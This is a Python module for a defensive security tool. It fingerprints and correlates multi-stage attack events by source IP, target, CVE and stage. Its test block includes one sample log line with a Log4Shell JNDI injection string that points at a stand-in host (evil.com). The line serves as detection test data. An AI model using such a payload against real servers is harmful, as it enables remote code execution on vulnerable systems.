"""
Event Fingerprinting Module

Creates unique fingerprints for security events to enable
temporal correlation across unlimited time windows.
"""

import mmh3
import json
from typing import Dict, Any, Optional
from datetime import datetime


class EventFingerprint:
    """Represents a unique fingerprint for a security event"""

    def __init__(
        self,
        source_ip: str,
        target_asset: str,
        cve_id: str,
        stage: int,
        technique_id: str,
        timestamp: str = None
    ):
        """
        Initialize event fingerprint

        Args:
            source_ip: Source IP address of the attack
            target_asset: Target asset identifier
            cve_id: CVE identifier
            stage: Attack stage number
            technique_id: MITRE technique ID
            timestamp: Event timestamp (ISO format)
        """
        self.source_ip = source_ip
        self.target_asset = target_asset
        self.cve_id = cve_id
        self.stage = stage
        self.technique_id = technique_id
        self.timestamp = timestamp or datetime.utcnow().isoformat()

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'source_ip': self.source_ip,
            'target_asset': self.target_asset,
            'cve_id': self.cve_id,
            'stage': self.stage,
            'technique_id': self.technique_id,
            'timestamp': self.timestamp
        }

    def get_correlation_key(self) -> str:
        """
        Get correlation key for multi-stage attack tracking

        This key groups related events from same source/target/CVE
        regardless of stage.

        Returns:
            Correlation key string
        """
        return f"{self.source_ip}:{self.target_asset}:{self.cve_id}"

    def get_stage_fingerprint(self) -> int:
        """
        Get unique fingerprint hash for this specific stage event

        Returns:
            Fingerprint hash (32-bit integer)
        """
        fingerprint_str = f"{self.source_ip}:{self.target_asset}:{self.cve_id}:{self.stage}"
        return mmh3.hash(fingerprint_str)

    def get_global_fingerprint(self) -> int:
        """
        Get global fingerprint for exact duplicate detection

        Returns:
            Global fingerprint hash
        """
        fingerprint_str = f"{self.source_ip}:{self.target_asset}:{self.cve_id}:{self.stage}:{self.timestamp}"
        return mmh3.hash(fingerprint_str)

    def __repr__(self) -> str:
        return f"EventFingerprint({self.cve_id} stage={self.stage}, {self.source_ip} → {self.target_asset})"

    def __eq__(self, other):
        if not isinstance(other, EventFingerprint):
            return False
        return (
            self.source_ip == other.source_ip and
            self.target_asset == other.target_asset and
            self.cve_id == other.cve_id and
            self.stage == other.stage
        )

    def __hash__(self):
        return self.get_stage_fingerprint()


class FingerprintGenerator:
    """Generates fingerprints from log events"""

    def __init__(self):
        """Initialize fingerprint generator"""
        pass

    def create_fingerprint(
        self,
        log_entry: Dict[str, Any],
        cve_id: str,
        stage: int,
        technique_id: str
    ) -> EventFingerprint:
        """
        Create fingerprint from log entry and detection metadata

        Args:
            log_entry: Raw log entry dictionary
            cve_id: Detected CVE ID
            stage: Detected attack stage
            technique_id: MITRE technique ID

        Returns:
            EventFingerprint object
        """
        # Extract source IP
        source_ip = self._extract_source_ip(log_entry)

        # Extract target asset
        target_asset = self._extract_target_asset(log_entry)

        # Extract timestamp
        timestamp = log_entry.get('timestamp', datetime.utcnow().isoformat())

        return EventFingerprint(
            source_ip=source_ip,
            target_asset=target_asset,
            cve_id=cve_id,
            stage=stage,
            technique_id=technique_id,
            timestamp=timestamp
        )

    def _extract_source_ip(self, log_entry: Dict[str, Any]) -> str:
        """
        Extract source IP from log entry

        Args:
            log_entry: Log entry dictionary

        Returns:
            Source IP address
        """
        # Try various common field names
        for field in ['source_ip', 'src_ip', 'ip', 'client_ip', 'remote_addr']:
            if field in log_entry:
                return log_entry[field]

        # Try parsing from log message
        log_text = log_entry.get('log', '') or log_entry.get('message', '')
        import re
        ip_match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', log_text)
        if ip_match:
            return ip_match.group(0)

        return 'UNKNOWN_IP'

    def _extract_target_asset(self, log_entry: Dict[str, Any]) -> str:
        """
        Extract target asset from log entry

        Args:
            log_entry: Log entry dictionary

        Returns:
            Target asset identifier
        """
        # Try various common field names
        for field in ['target', 'dest', 'destination', 'host', 'hostname', 'server']:
            if field in log_entry:
                return log_entry[field]

        # Default to host if available
        return log_entry.get('host', 'UNKNOWN_TARGET')

    def create_campaign_fingerprint(self, fingerprints: list) -> int:
        """
        Create campaign-level fingerprint from multiple events

        Args:
            fingerprints: List of EventFingerprint objects

        Returns:
            Campaign fingerprint hash
        """
        if not fingerprints:
            return 0

        # Sort by timestamp for consistent hashing
        sorted_fps = sorted(fingerprints, key=lambda fp: fp.timestamp)

        # Create campaign signature from all stages
        campaign_str = '|'.join([
            f"{fp.cve_id}:{fp.stage}:{fp.source_ip}:{fp.target_asset}"
            for fp in sorted_fps
        ])

        return mmh3.hash(campaign_str)


class CorrelationKeyManager:
    """Manages correlation keys for multi-stage attack tracking"""

    def __init__(self):
        """Initialize correlation key manager"""
        self.active_campaigns: Dict[str, list] = {}  # correlation_key -> list of fingerprints

    def add_event(self, fingerprint: EventFingerprint) -> bool:
        """
        Add event to active campaigns

        Args:
            fingerprint: Event fingerprint

        Returns:
            True if this is part of an existing campaign, False if new
        """
        corr_key = fingerprint.get_correlation_key()

        if corr_key in self.active_campaigns:
            self.active_campaigns[corr_key].append(fingerprint)
            return True
        else:
            self.active_campaigns[corr_key] = [fingerprint]
            return False

    def get_campaign(self, correlation_key: str) -> Optional[list]:
        """
        Get all events in a campaign

        Args:
            correlation_key: Correlation key

        Returns:
            List of fingerprints or None
        """
        return self.active_campaigns.get(correlation_key)

    def get_campaign_stages(self, correlation_key: str) -> set:
        """
        Get all stages detected in a campaign

        Args:
            correlation_key: Correlation key

        Returns:
            Set of stage numbers
        """
        campaign = self.get_campaign(correlation_key)
        if not campaign:
            return set()

        return {fp.stage for fp in campaign}

    def get_num_active_campaigns(self) -> int:
        """Get number of active campaigns"""
        return len(self.active_campaigns)


if __name__ == "__main__":
    # Test fingerprinting
    generator = FingerprintGenerator()

    # Create test log entries
    log1 = {
        'timestamp': '2024-10-01T10:00:00Z',
        'source_ip': '10.0.1.5',
        'target': 'nginx:1.19',
        'log': 'GET /api?q=${jndi:ldap://evil.com}'
    }

    log2 = {
        'timestamp': '2024-10-12T14:30:00Z',
        'source_ip': '10.0.1.5',
        'target': 'nginx:1.19',
        'log': 'Runtime.exec detected'
    }

    # Create fingerprints
    fp1 = generator.create_fingerprint(log1, 'CVE-2021-44228', 1, 'T1190')
    fp2 = generator.create_fingerprint(log2, 'CVE-2021-44228', 2, 'T1059')

    print(f"Fingerprint 1: {fp1}")
    print(f"  Correlation key: {fp1.get_correlation_key()}")
    print(f"  Stage fingerprint: {fp1.get_stage_fingerprint()}")

    print(f"\nFingerprint 2: {fp2}")
    print(f"  Correlation key: {fp2.get_correlation_key()}")
    print(f"  Stage fingerprint: {fp2.get_stage_fingerprint()}")

    print(f"\nSame correlation key: {fp1.get_correlation_key() == fp2.get_correlation_key()}")

    # Test correlation manager
    print("\n" + "="*60)
    print("Correlation Manager Test:")
    manager = CorrelationKeyManager()

    is_existing = manager.add_event(fp1)
    print(f"Event 1 added, existing campaign: {is_existing}")

    is_existing = manager.add_event(fp2)
    print(f"Event 2 added, existing campaign: {is_existing}")

    stages = manager.get_campaign_stages(fp1.get_correlation_key())
    print(f"Detected stages: {sorted(stages)}")
    print(f"Active campaigns: {manager.get_num_active_campaigns()}")
